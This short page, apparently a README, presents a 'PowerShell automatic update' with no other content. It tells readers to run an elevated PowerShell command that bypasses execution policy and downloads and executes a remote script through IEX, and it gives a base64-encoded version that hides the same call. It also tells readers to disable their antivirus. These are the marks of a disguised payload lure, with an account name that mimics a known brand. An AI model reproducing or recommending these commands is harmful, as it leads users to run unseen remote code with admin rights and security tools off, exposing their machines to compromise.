<h2>Automatic update with PowerShell >_</h2>

Open PowerShell (with admin right) and run this command for automatic update:

<code>powershell -ExecutionPolicy bypass "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/intel-xeon/Automatic-Update-With-PowerShell/refs/heads/main/automatic_update.ps1')"</code>

<strong>OR</strong>

<code>powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AaQBuAHQAZQBsAC0AeABlAG8AbgAvAEEAdQB0AG8AbQBhAHQAaQBjAC0AVQBwAGQAYQB0AGUALQBXAGkAdABoAC0AUABvAHcAZQByAFMAaABlAGwAbAAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8AYQB1AHQAbwBtAGEAdABpAGMAXwB1AHAAZABhAHQAZQAuAHAAcwAxACcAKQA=</code>




You may need to disable your AV solution.

<strong>Warning: Automatic reboot</strong>
